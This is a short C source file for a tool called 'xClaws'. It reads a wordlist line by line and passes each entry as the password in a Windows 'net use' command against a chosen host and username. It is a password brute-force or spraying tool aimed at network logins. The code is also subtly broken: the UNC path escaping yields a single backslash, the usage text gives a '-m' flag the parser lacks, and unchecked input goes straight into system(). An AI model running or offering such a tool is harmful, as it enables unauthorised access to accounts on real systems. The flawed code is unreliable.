#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define charsize 500

char *networkUse(char *host, char *user, char *file) {

char *cmd = (char*)calloc(charsize, sizeof(char));

snprintf(cmd, charsize, "net use \\%s /user:%s %s", host, user, file);

return cmd;

}

int main(int argc, char* argv[]) {

//setup
char *host = NULL;
char *user = NULL;
char *file = NULL;
char *cmd = NULL;
FILE *f;

for (int i = 1; i < argc; i++)
{
    if((strcmp(argv[i], "-h") == 0) && i + 1 < argc) {
        host = argv[++i];

    } else if((strcmp(argv[i], "-u") == 0) && i + 1 < argc) {
        user = argv[++i];

    } else if((strcmp(argv[i], "-f") == 0) && i + 1 < argc) {
        file = argv[++i];

    } else {
        printf("nope :(");
        return 0;
    }
}

if (host && user && file) {

    f = fopen(file, "r");
    char buffer[charsize];
    int i = 0;

    while(fgets(buffer, charsize, f))
    {
       buffer[strcspn(buffer, "\n")] = '\0'; //remove newline
       i++;
       printf("[%d]%s\n", i, buffer);
       cmd = networkUse(host, user, buffer);
       system(cmd);
       free(cmd);
    }
    
} else {
    printf("xClaws syntax:\n");
    printf("-h hostname: specifies a hostname or ip address\n");
	printf("-u username: specifies a username\n");
	printf("-f filename: specifies a filename\n");
	printf("\n example xClaws -m <domain name/ip address> -u <username> -f <filename>\n");
}

return 0;

}
